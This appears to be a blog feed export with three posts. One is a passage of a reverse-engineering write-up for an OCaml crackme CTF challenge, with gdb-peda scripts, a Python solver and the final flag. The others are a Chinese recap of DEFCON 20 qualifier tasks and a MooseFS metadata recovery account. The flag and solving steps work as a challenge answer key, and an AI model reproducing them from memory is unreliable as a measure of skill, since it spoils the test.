<p>Deeper diving reaveals that the check function will invoke a list of functions to check the input value, and whenever something went wrong, the return value would be fail.</p>

<ul>
<li>The first one is at <code>0x4024a0</code>, which is a simple function who parse the arg to a ocaml list of chars.</li>
<li>The second one is at <code>0x402520</code>, which is the check length function. From here we know the list size should be 16.</li>
<li>The third one is at <code>0x402790</code>, ah, a magic string <code>The sky above the port was the color of...</code> can be seen here, it seems that some permutation operations are done here, and will always give positive return value, so just leave it here for later analysis.</li>
<li>The fourth one is at <code>0x402870</code>, this is the real check, and will return false if the check fails.</li>
<li>And there are function 5, 6, 7, will check after function 4. Leave them for later analysis.</li>
</ul>


<p>Ok now we know that we should run the program with a string as argument of 16 bytes, and if the string match something, the <code>task.exe</code> will print happy result. And it&rsquo;s very likely that the input argument should be the flag.</p>

<p>There are a lot of ocaml library functions out there without any signature, making it very hard to read assembly. So I compiled a <code>helloworld</code> program using <code>ocamlopt -g hw.ml</code>, and by comparing the hex code, I can identify a lot of important ocaml functions like <code>camlList__map</code>, <code>camlList_c_call</code>, <code>camlList__combine</code>, <code>caml_equal</code>.</p>

<p>But it&rsquo;s still very hard to figure out the actual behavior under the assembly code. Now it&rsquo;s time for the <a href="http://github.com/longld/peda">peda</a> weapon.</p>

<p>I wrote a small piece of code in <a href="http://github.com/longld/peda">peda</a> to print ocaml list values</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">ocamlist</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">arg</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&quot;&quot;&quot;</span>
</span><span class='line'><span class="sd">    dump ocaml list</span>
</span><span class='line'><span class="sd">    Usage:</span>
</span><span class='line'><span class="sd">        ocamlist register</span>
</span><span class='line'><span class="sd">        ocamlist address</span>
</span><span class='line'><span class="sd">    &quot;&quot;&quot;</span>
</span><span class='line'>    <span class="p">(</span><span class="n">address</span><span class="p">,)</span> <span class="o">=</span> <span class="n">normalize_argv</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">address</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">_missing_argument</span><span class="p">()</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">str</span><span class="p">(</span><span class="n">address</span><span class="p">)</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">&quot;r&quot;</span><span class="p">):</span>
</span><span class='line'>        <span class="n">address</span> <span class="o">=</span> <span class="n">peda</span><span class="o">.</span><span class="n">getreg</span><span class="p">(</span><span class="n">arg</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span><span class='line'>    <span class="k">else</span><span class="p">:</span>
</span><span class='line'>        <span class="n">address</span> <span class="o">=</span> <span class="n">to_int</span><span class="p">(</span><span class="n">arg</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
</span><span class='line'>        <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">peda</span><span class="o">.</span><span class="n">read_int</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>
</span><span class='line'>        <span class="n">address</span> <span class="o">=</span> <span class="n">peda</span><span class="o">.</span><span class="n">read_int</span><span class="p">(</span><span class="n">address</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">address</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">:</span>
</span><span class='line'>            <span class="k">break</span>
</span><span class='line'>    <span class="n">msg</span><span class="p">(</span><span class="s">&#39;ocamllist: (</span><span class="si">%d</span><span class="s">) </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">),</span> <span class="nb">repr</span><span class="p">(</span><span class="n">result</span><span class="p">)))</span>
</span><span class='line'>    <span class="k">return</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now fire! gdbinit here</p>

<pre><code>file task.exe
b *0x402baa
r 1234567890ABCDEF
</code></pre>

<p><code>continue</code> at gdb to skip the first function. Then <code>ocamlist $rax</code></p>

<pre><code>Breakpoint 1, 0x0000000000402baa in ?? ()
gdb-peda$ ocamlist $rax
ocamllist: (16) [99, 101, 103, 105, 107, 109, 111, 113, 115, 97, 131, 133, 135, 137, 139, 141]
</code></pre>

<p>Oops, why should ocaml put <code>2x+1</code> value in the list. Never mind.</p>

<p><code>continue</code> two times to skip the length check. Then <code>ocamlist $rax</code></p>

<pre><code>Breakpoint 1, 0x0000000000402baa in ?? ()
gdb-peda$ ocamlist $rax
ocamllist: (16) [101, 135, 115, 111, 97, 141, 139, 99, 137, 133, 113, 103, 109, 107, 105, 131]
</code></pre>

<p>Now we have the permutation table. :)</p>

<p><code>ni</code> into <code>0x402870</code>, and <code>ni</code> to <code>0x402888</code>, <code>ocamlist $rax</code></p>

<pre><code>gdb-peda$ ocamlist $rax
ocamllist: (8) [137, 133, 113, 103, 109, 107, 105, 131]
</code></pre>

<p>so <code>0x4025e0</code> cut the list from index 8, return the second part. <code>ni</code> to <code>0x40289d</code></p>

<pre><code>0x000000000040289d in ?? ()
gdb-peda$ ocamlist $rax
ocamllist: (8) [101, 135, 115, 111, 97, 141, 139, 99]
</code></pre>

<p>we got the first half. Then at <code>0x4028a1</code>, we can identify the function called to be <code>camlList__combine</code> by comparing hex code, we can also know the function <code>camlList__map</code> called at <code>0x4028b0</code>, <code>caml_equal</code> loaded at <code>0x4028bf</code>, and the constant list at <code>0x4028b5</code> is</p>

<pre><code>gdb-peda$ ocamlist 0x621c20
ocamllist: (8) [591, 599, 687, 663, 475, 687, 687, 609]
</code></pre>

<p>So, the logic here become evident. if written in python, it should be sth like this</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">combined</span> <span class="o">=</span> <span class="nb">zip</span><span class="p">(</span><span class="n">lst</span><span class="p">[:</span><span class="mi">8</span><span class="p">],</span> <span class="n">lst</span><span class="p">[</span><span class="mi">8</span><span class="p">:])</span>
</span><span class='line'><span class="n">maped</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">combined</span><span class="p">)</span>
</span><span class='line'><span class="k">assert</span> <span class="n">maped</span> <span class="o">==</span> <span class="p">[</span><span class="mi">591</span><span class="p">,</span> <span class="mi">599</span><span class="p">,</span> <span class="mi">687</span><span class="p">,</span> <span class="mi">663</span><span class="p">,</span> <span class="mi">475</span><span class="p">,</span> <span class="mi">687</span><span class="p">,</span> <span class="mi">687</span><span class="p">,</span> <span class="mi">609</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now we need to know the function f, <code>si</code> into <code>camlList__map</code> and we can find out f at <code>0x402360</code></p>

<pre><code>=&gt; 0x402360:    sar    rbx,1
   0x402363:    lea    rax,[rax+rbx*4]
   0x402367:    ret
</code></pre>

<p>so the python code can be completed</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">combined</span> <span class="o">=</span> <span class="nb">zip</span><span class="p">(</span><span class="n">lst</span><span class="p">[:</span><span class="mi">8</span><span class="p">],</span> <span class="n">lst</span><span class="p">[</span><span class="mi">8</span><span class="p">:])</span>
</span><span class='line'><span class="n">maped</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">combined</span><span class="p">)</span>
</span><span class='line'><span class="k">assert</span> <span class="n">maped</span> <span class="o">==</span> <span class="p">[</span><span class="mi">591</span><span class="p">,</span> <span class="mi">599</span><span class="p">,</span> <span class="mi">687</span><span class="p">,</span> <span class="mi">663</span><span class="p">,</span> <span class="mi">475</span><span class="p">,</span> <span class="mi">687</span><span class="p">,</span> <span class="mi">687</span><span class="p">,</span> <span class="mi">609</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>the next 3 check functions are at <code>0x4029e0</code>, <code>0x402a80</code>, <code>0x402b20</code>, all of them looks like the function we just analysed. It&rsquo;s obvious <code>0x402b20</code> is the simplest. Using the same technique stated above. We can find out this check is actually doing this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">assert</span> <span class="n">lst</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span> <span class="o">==</span> <span class="p">[</span><span class="mi">145</span><span class="p">,</span> <span class="mi">195</span><span class="p">,</span> <span class="mi">233</span><span class="p">,</span> <span class="mi">229</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">243</span><span class="p">,</span> <span class="mi">229</span><span class="p">,</span> <span class="mi">233</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>WTF? I just cannot believe this. Fine, we do not need to analyze other functions. Now we can get our most wanted flag</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">rev</span> <span class="o">=</span> <span class="p">[</span><span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">5</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">fun7</span> <span class="o">=</span> <span class="p">[</span><span class="mi">145</span><span class="p">,</span> <span class="mi">195</span><span class="p">,</span> <span class="mi">233</span><span class="p">,</span> <span class="mi">229</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">243</span><span class="p">,</span> <span class="mi">229</span><span class="p">,</span> <span class="mi">233</span><span class="p">]</span>
</span><span class='line'><span class="n">fun4</span> <span class="o">=</span> <span class="p">[</span><span class="mi">591</span><span class="p">,</span> <span class="mi">599</span><span class="p">,</span> <span class="mi">687</span><span class="p">,</span> <span class="mi">663</span><span class="p">,</span> <span class="mi">475</span><span class="p">,</span> <span class="mi">687</span><span class="p">,</span> <span class="mi">687</span><span class="p">,</span> <span class="mi">609</span><span class="p">]</span>
</span><span class='line'><span class="n">p</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span><span class='line'>    <span class="n">p</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">fun4</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="p">(</span><span class="n">fun7</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
</span><span class='line'><span class="n">lst</span> <span class="o">=</span> <span class="n">p</span> <span class="o">+</span> <span class="n">fun7</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
</span><span class='line'><span class="n">lst</span> <span class="o">=</span> <span class="p">[(</span><span class="n">lst</span><span class="p">[</span><span class="n">rev</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">lst</span><span class="p">))]</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,</span> <span class="n">lst</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>The flag is <code>HenryDorsettCase</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Defcon 20 小记]]></title>
    <link href="http://blog.ztrix.me/blog/2012/06/08/defcon-ctf-quals-20/"/>
    <updated>2012-06-08T23:35:35+08:00</updated>
    <id>http://blog.ztrix.me/blog/2012/06/08/defcon-ctf-quals-20</id>
    <content type="html"><![CDATA[<p>6 月 2 号到 4 号有幸加入 blue-lotus 参加了 defcon CTF 2012 的比赛，感慨颇深。清华第一次组队参加这个比赛，虽然没进决赛，但第一次参赛能进前 20，也算不错的成绩了。</p>

<!-- more -->


<p>第一次参加 CTF，对于题目最大的感觉就是没有头绪。其实题目涉及面太广，许多题目了解背景知识很快即可破题，不知道的人，想破脑袋也解不出。比如 Forensics 100 的题目，给了个文件系统，大家全在文件系统里面翻，看到一堆又一堆的头文件，但是就是没有结果。等到赛后看了 writeup，发现使用 <a href="http://www.sleuthkit.org/">STK</a> 用一行命令就能得到 key:</p>

<pre><code>blkls -s f100_xxx
</code></pre>

<p>大家大呼坑爹，这谁知道啊！！为什么这样得到的是 key 啊！！有没有什么解释啊！！</p>

<p>但是事实是无情的，虽然是 100 分的题目，只要一个命令，但是我们就是解不出来，而各国牛队则瞬秒。这也许就是经验的差距吧。</p>

<h2>Grab Bag</h2>

<p>Grab Bag 的题目普遍简单，5 道题目我们解出来 4 题，最后的 500 分题到现在 writeup 都没出来，估计也没几个队做出来了。</p>

<h3>grab bag 100</h3>

<p>gb100 的题目就一句话： <code>hack the planet_</code>。我就一直在思考为啥 planet 后面是个下划线。结果没过几分钟，我们组就有人做出来了，key 就是一个 <code>!</code>，当时也没多想，现在才发现，下划线的意思是在最后填一个 <code>char</code>，<code>hack the planet!</code> 可能是一句 hack 文化里面的 slang 吧。所以没有点背景知识就来打酱油真不行。</p>

<h3>grab bag 200</h3>

<p>gb200 的题目是给一个图片和一个 mac double format 文件，mac double format 里面藏了一个链接链到图片的原文件，对比一下发现给的图片后面附加了一个 DNS PTR 查询包。于是大家都想到了构造这个包再发一遍，但是，结果别人得到了结果，我没得到。悲剧！等到赛后看 writeup，发现原来我没有把 source port 指定相同。唉！就差了一步呀。</p>

<h3>grab bag 300</h3>

<p>gb300 是个破解 ATM 取款机的题目，组里有人一眼就看出了规律，太强了！但是人眼看速度不够，只好写程序，好吧，我写得没别人快，就没继续做了。</p>

<h3>grab bag 400</h3>

<p>gb400 是个 SQL 注入，组里有强人立刻就发现了漏洞入口了，好强。没有注入经验，果断不会，好在有强人在，很快解决了。</p>

<h2>Random</h2>

<h3>random 100</h3>

<p>random100 也是让人摸不着头脑的题目，题目是一句话：</p>

<pre><code>How many developers;) did it take to secure Windows 8?
</code></pre>

<p>key 是 152，看了 writeup 也不知道为啥，甚至当时大家做出来的时候，都不知道谁做出来了。我当时写了个脚本把 1 到 1000 都遍历提交了一遍，莫非是我解决的？好开心！</p>

<h3>random 200</h3>

<p>random200 果断不会，今天看 <a href="http://devtrixlabs.com/blog/2012/06/defcon-2012-urandom-200-writeup/">writeup</a>，发现前面都正常，到了最后，作者发现了这个的时候：</p>

<pre><code>fr an
it ha
hi ez
jp er
en-us !!
</code></pre>

<p>他居然直接就猜出了 key 是 <code>icanhazcheezburger!!</code> 。这也太假了吧！！莫非是有我们不知道的 hacker 典故？还是这个人是脑力王？？</p>

<h3>random 300</h3>

<p>random 300 是最 straight forward 的一到题目了，要求用足够少的交换次数把 100000 个 uint16 排序。我开始怕超时写了个 qsort，结果发现交换次数太多。然后准备写 O(n<sup>2</sup>) 的 selection sort，达到最多交换次数 N-1。结果写到一半又被别人抢先了。悲剧！</p>

<h2>Forensics</h2>

<p>binary 和 pwnable 的题都要求 binary 调试，还是各种 MIPS Binary，FreeBSD，我果断看都没看。不过取证这块还是可以看看的。</p>

<h3>Forensics 200</h3>

<p>大家都盯着那几个图片看了。结果又是一道工具题，不知道的人果断是解不出来的，结果也就几行命令：</p>

<pre><code>stegdetect -s 2 2467trash.jpg
outguess -r -e -k “ddtek” 2467trash.jpg key
</code></pre>

<p>原来是道 Steganography 的题目。好吧，现在懂了，不过这个 outguess 里面用到的 ddtek 是怎么来的，writeup 作者说是用了一个字典搜的，换作我们，即使知道用 outguess 也猜不出 key 吧，谁的字典里会有 ddtek ?</p>

<h3>Forensics 300</h3>

<p>Hooray! 这是我唯一解出来并提交的题目！大概就是给了个 OpenWRT 的 firmware 镜像，用 <a href="http://code.google.com/p/firmware-mod-kit/">firmware-mod-kit</a> 解一下，就能得到答案了。太开心了！</p>

<h2>Binary</h2>

<p>突然想起来，其实还是看了一道 binary 题目的，就是 bin 100 的题目。这也是一道好可惜的题目。题目给了一个用 skynet 漏洞的 ssh 和它的输出文件 mac.h，我们也发现了 mac.h 是用直接去反编码的 ASCII。但是谁知道 key 就在里面！！我们都跑去分析给的另外两个 ssh 和 sshd 了。好在最后还是做出来了。不知道是谁试的。其实我印象中记得我把 mac.h 里面的字符串都试了一遍，为啥我们试出来？RPWT？</p>

<h2>总结</h2>

<p>Anyway，比赛已经过去。很高兴能认识很多安全领域的牛人，也很开心打酱油也能做出题来。发个结果图和名字纪念一下吧！期待明年再战！</p>

<p><a href="http://repo.shell-storm.org/CTF/Defcon-20-quals/Scoreboard.txt">最终排名</a> 和最终解题结果：</p>

<p><img class="middle" src="http://blog.ztrix.me/images/defcon-20-blue-lotus.jpg" title="'defcon 20 quals rank'" ></p>

<p>其中绿色是我们解出来的题目，蓝色是我们没解出来，但是有队伍解出来的题目，灰色是还没开放的题目。紫色是当前在做的题目。再发个链接：<a href="http://devpsc.blogspot.jp/2012/06/defcon-20-quals-writeup-collection.html">writeup collection</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[MooseFS metadata.mfs 数据恢复纪实]]></title>
    <link href="http://blog.ztrix.me/blog/2012/05/13/restore-mfs-metadata/"/>
    <updated>2012-05-13T16:57:08+08:00</updated>
    <id>http://blog.ztrix.me/blog/2012/05/13/restore-mfs-metadata</id>
    <content type="html"><![CDATA[<p>从这周四下午到周六早上这 40 个小时真是紧张惊险又刺激。以至于我要写篇 blog 来记录一下。</p>

<h2>数据丢失! 天灾人祸!</h2>

<p>实验室跑了一套自己的网盘系统，其中后台数据存储用的是 Moosefs 网络分布式文件系统。这个系统用起来一直很好，直到 2 天前&hellip;</p>

<!-- more -->


<p>周四下午，机房突然断电，听说是隔壁机房安装照明灯的时候不小心短路造成的跳闸（这机房真是！！随便就断电！！还没有UPS！！）。好吧，断电这种事情，也经历多次了，所以大家都不在意。</p>

<p>来电之后，服务器都自动启动了。但是过了很久，服务都没自动启动——服务都是有自动启动脚本的，平常断电之后服务都会自动启动——于是我就手动 ssh 到服务器去查，发现 moosefs 的 master 没有运行。我想可能是自动启动失败了，就尝试手动启动它。结果发现仍然不能启动，给我的提示信息是，metadata.mfs 文件不存在。</p>

<pre><code>can't open metadata file
if this is new instalation then rename metadata.mfs.empty as metadata.mfs
init: file system manager failed !!!
error occured during initialization - exiting
</code></pre>

<p>这个时候我才想起来，moosefs 运行的时候，会把 metadata.mfs 重命名成 metadata.mfs.back，正常结束的时候再重命名回去，而这次是突然断电，所以 metadata.mfs 不存在，mfsmaster 拒绝启动。</p>

<p>于是我再把 metadata.mfs.back 重命名成 metadata.mfs，再次启动，结果又出了错误信息：</p>

<pre><code>loading metadata ...
can't read metadata header
init: file system manager failed !!!
error occured during initialization - exiting
</code></pre>

<p>突然我心里一紧，感觉到问题有点严重。难道断电导致了文件损坏？于是我去检查这个文件，仔细一看，文件大小居然是 0 ！也就是说之前的 200M metadata 信息全部丢失！直接导致 moosefs 里面存的 50T 数据全部变成了废数据。并且，这个文件之前因为一直没人注意，还是没有备份的！！这真是天灾人祸并发呀！</p>

<h2>丢失原因？</h2>

<p>难道有人不小心动了这个文件，或者有人有误操作？我把操作历史看了几遍，确认没有人动这个文件，也没有误操作。那文件是怎么就变成 0 了的呢？</p>

<p>实验室展开了火热的讨论。最终总结出这么几个可能导致文件丢失的原因：</p>

<ul>
<li>ext4 文件系统的 delay allocation 导致的。moosefs 在持久化 metadata 信息的时候，会重写整个文件。他会首先把之前的 metadata.mfs.back 文件重命名成 metadaba.mfs.back.tmp，然后开始写 metadata.mfs.back 文件，写完了 fclose 之后，删除 metadata.mfs.back.tmp。如果断电的时候，正常在进行这么一个过程，那么有可能 fclose 之后，metadata.mfs.back.tmp 也删除了，但是 ext4 的 delay allocation 特性导致文件还没有真正写入到磁盘。（也有可能文件写入了磁盘 block，但是文件 inode 还没有更新）。我们在网上发现有不少人也遇到过同样的断电之后文件大小变成 0 的问题，如这个：<a href="http://www.symantec.com/connect/blogs/ext4-data-recovery-how-recovery-lost-files-ext4-file-system-linux">http://www.symantec.com/connect/blogs/ext4-data-recovery-how-recovery-lost-files-ext4-file-system-linux</a></li>
<li>有可能是 moosefs 写 metadata 失败导致的。阅读了相关源代码之后，我们发现 moosefs 写文件和 fclose 的时候居然从来不判断返回值！有些地方有判断返回值，但是也仅仅打印一句 log，既不做相应错误处理，也不停止。于是就有可能是写文件失败，fclose 也失败，但是它不查返回值，所以又把之前的 metadata.mfs.back.tmp 删除了。</li>
<li>有可能是 ext4 修复导致的。断电造成文件系统出现不一致，然后自动修复之后造成了数据丢失。这突然让我想起了我去年 11 月的遭遇(<a href="https://twitter.com/#!/zhuwl08/status/129538485156716544">https://twitter.com/#!/zhuwl08/status/129538485156716544</a>)，当时写代码写着写着居然代码文件变成了目录，代码也丢了。我用的也是 ext4，这不断电都可以出这样的事情，断电丢个文件也就不算什么了。可见 ext4 还是不够靠谱阿。</li>
</ul>


<h2>数据恢复</h2>

<p>再怎么分析丢失原因也于事无补了，于是大家开始各种尝试恢复数据。我们先把服务器关机，用一个启动盘启动，然后把整个分区 dd 出来，每人发一份尝试恢复。</p>

<h3>数据恢复软件</h3>

<p>首先尝试的是 extundelete 和 ext3grep，尝试了几次之后，发现实在是太弱了，不仅啥都恢复不出来，给个 <code>--restore-all</code> 参数居然直接就崩溃了。</p>

<p>随后发现 R-Linux 这个软件貌似比较强大，于是立刻去下载了一个。试了一下，果然很强大！能进行各种恢复：按时间，按文件类型，按目录。于是开始用它来跑。</p>

<p>我们先试了目录恢复，恢复出了两个文件，但是大小也是 0。再尝试按时间恢复，把最近 5 个月的全部恢复出来。这一下恢复出了一堆数据。居然之前已经删除的各种 log 什么的都还能恢复出来！但是一番搜索之后，我们发现，几个月前的数据都能恢复，单独这个当天的数据怎么也恢复不出来。折腾了很久之后，R-Linux 能耍的花样我们都试了一遍，结果是一无所获。大家都有点灰心丧气，觉得用软件恢复可能性不大了。</p>

<p>另外一个尝试的软件是 photorec，据说也比较强大，但是我没有用过。一位师兄尝试了之后说 photorec 结果还不错，能找到一些开头信息，但是，也找不全，或者文件大小太大，居然有 2G+。那个文件显然没有这么大。</p>

<h3>数据恢复公司</h3>

<p>希望在恢复软件上破灭之后，又在专业数据恢复公司上升起。我们打听到飞客数据恢复中心很不错，有个师兄就拿着数据去了中关村。经过焦急的等待，最终，等来的还是坏消息：inode 被覆盖了，无法恢复数据。</p>

<h3>自己动手</h3>

<p>看来得自己动手了。有人研究 ext4，有人研究是否有可能重建索引，我则去研究 medatata.mfs 文件格式。</p>

<p>moosefs 最坑爹的一点就是：没文档，代码没注释，所以想了解 metadata.mfs 文件格式的话，只能阅读源代码了。</p>

<h4>header</h4>

<p>首先发现的一点就是，metadata.mfs 前 8 个字节是 magic number: &ldquo;MFSM 1.5&#8221;。于是我写了个 c 程序，从头到尾搜索了一遍，总共发现了 17 个。能找到文件开头就标志还有希望！</p>

<p>由于文件开头总是应该在 block 的起始(查了一下 我们用的 ext4 blocksize 是 4096)，所以排除了其中 7 个位置不能被 4096 整除的，还剩下 10 个。</p>

<p>继续看代码，发现 9 &ndash; 12 字节是 maxID，越大表示文件越新。把 10 个开头都看了一遍，发现其中第 9 个最新，文件相对于分区 image 的 offset 为：50440699904 byte。</p>

<p>于是我准备从这里开始，顺藤摸瓜找下去，看看能找到多少有用的信息。如果这个文件格式特征明显的话，应该是能够顺藤摸瓜搜索拼接出来的。</p>

<h4>写程序解析 medadata.mfs</h4>

<p>花了几个小时时间，我利用 moosefs 的源码，写了一个程序去解析 metadata.mfs 文件。一旦解析出错，程序就会自动报错退出，从而知道拼接出来的文件是错误的。这样我就可以去看文件在这个地方大概是什么样的，下面应该是什么样，找出特征写程序搜索。</p>

<p>写完程序之后，把刚才的第 9 个开头开始的前面几M dd 出来。然后跑了一遍程序。运气不错！连续 16M 的数据都是属于 metadata.mfs 的，到了 16M 和 17M 的交界处，程序解析出错了，说明文件到这里不连续了，那么下一段文件在哪呢？是否还在磁盘上呢？</p>

<p>进一步分析发现，这前 16M 数据都是 metadata.mfs 的 node 信息。</p>

<p>这里顺便提一下 metadata.mfs 的文件格式。这个文件由好几个部分组成：首先是 header, 24bytes, 然后是 node 信息，最后用一个空 node 标志结束，然后是 edge 信息，同样用一个空 edge 标志结束。这两个部分比较大，node 部分基本占总文件的一半，edge 部分占四分之一。</p>

<p>node 和 edge 之后，是比较小的一些杂乱信息。最后一部分是比较长的 chunk 信息，最后用一个空 chunk 来标志结束。也就是说这个文件基本上每个区的结束都是用这个区的一个空数据结构来标志的，而不是有一个区 header 指定长度。</p>

<p>找到前面 16M 之后，我就开始琢磨怎么寻找下一段数据。用 xxd 看了一下前面 16M 数据，发现每个 node 信息数据结构里面都有 4 个时间，分别是 atime, ctime, mtime 和 trash time(单位是 s，from epoch)。系统是今年才开始运行的，所以时间都是 2012 年之后，表示成 16 进制的话，就是 4f xx xx xx。于是特征就有了！如果一个 block 能接的上这个文件的前 16M 的话，他里面肯定会有很多时间信息，那就会有很多 4f。</p>

<p>我很快写了一个 c 程序，以 4096(block size) 为单位去读整个分区文件，然后统计这个 block 里面的 4f 的数量，如果超过一个 threshold 的话，说明很可能属于这个文件，那就可以继续分析接的上的问题了。程序跑了十几分钟，结果很不理想，因为太多了。大概有 4000 多个区块组都包含很多 4f，也就是说这 4000 个都有可能是这个文件的，也都有可能是正好接上这个文件的。刚刚才兴奋起来，这下又苦恼了。</p>

<p>不过天无绝人之路。我突然想到，说不定 ext4 分配数据区块给文件的时候，会向后找尽量近的地方。我就看了一下前面 16M 数据在我的分析结果里面的位置，然后发现，在它 32 M 之后，这个有很多 4f 这个特征又明显了起来。我把 32M 之后的数据 dd 了出来。那怎么知道是否和前面 16M 接的上呢？</p>

<p>我又看了一眼代码，发现每个 node 都有一个 id，于是加了一个 printf 去把这个 id 打印出来。结果让我非常惊喜，id 是连续的！所以如果正好能接得上的话，id 应该正好连续！我连忙把前 16M 的数据的最后一个 node id 打了出来，又用 xxd 看了一下后面的数据，id 真的是能正好接上的！于是文件的第二段就这么找到了！！</p>

<p>赶紧把两段数据拼接起来，跑了一遍程序，发现第二段还比较长，两段数据加起来有 56M 之多。到目前为止，文件的前 56M 已经被我恢复出来了。</p>

<p>用同样的方法继续寻找，我很快得到了文件的第 3 4 5 6 段。这样就有了 128M 的数据了。到了 128M 的时候，node 区结束了，到了 edge 区了。</p>

